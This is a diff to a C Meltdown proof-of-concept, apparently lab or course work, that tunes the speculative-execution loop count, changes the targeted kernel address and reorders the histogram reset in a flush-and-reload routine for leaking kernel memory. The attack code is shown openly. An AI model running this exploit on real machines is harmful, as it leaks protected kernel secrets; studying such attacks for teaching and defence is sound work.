@@ -1,17 +1,13 @@
 #include <stdint.h>
 #include <stdio.h>
 #include <unistd.h>
+#include <string.h>
 
 #include <emmintrin.h> /*Needed for _mm_cflush*/
 #include <x86intrin.h> /*Needed for __rdtscp*/
-
 #include <signal.h> /*Needed to catch segfault*/
 #include <setjmp.h> /*Needed to jump after catching segfault*/
-
-
-#include <string.h>
-
-#include <fcntl.h>
+#include <fcntl.h> /*Needed for open*/
 
 
 #define THRESHOLD_CYCLES 300
@@ -36,17 +32,16 @@ void flush_probe_array()
     }
 }
 
-
+//  https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf
+//  8-byte register  |  Bytes 0-3  |  Bytes 0-1  |  Byte 0
+//      %rax         |    %eax     |     %ax     |   %al  
+//      %rcx         |    %ecx     |     %cx     |   %cl  
 void meltdown_attack(unsigned long long kernel_address)
 {
-    //  8-byte register  |  Bytes 0-3  |  Bytes 0-1  |  Byte 0
-    //      %rax         |    %eax     |     %ax     |   %al  
-    //      %rcx         |    %ecx     |     %cx     |   %cl  
-    
     asm volatile (
 	    "retry:\n\t"
 
-	    ".rept 300\n\t"
+	    ".rept 3000\n\t"
 	    "add $0x141, %%rax\n\t"
 	    ".endr\n\t"
 
@@ -109,7 +104,7 @@ int main(){
             flush_probe_array();
 
             if(sigsetjmp(env, 1) == 0){
-                meltdown_attack(0xffffffffc0e64000 + secret_index);
+                meltdown_attack(0xffffffffc0f3c000 + secret_index);
             }
 
             get_access_time();
@@ -122,9 +117,9 @@ int main(){
             }
         }
 
-        memset(histogram, 0, sizeof(histogram));
-        printf("secret value guess %d, %c\n", page_hit, page_hit);
+        printf("secret value guess  %3d, %c\n", page_hit, page_hit);
         printf("number of hits %d\n", histogram[page_hit]);
+        memset(histogram, 0, sizeof(histogram));
     }
 
     return 1;
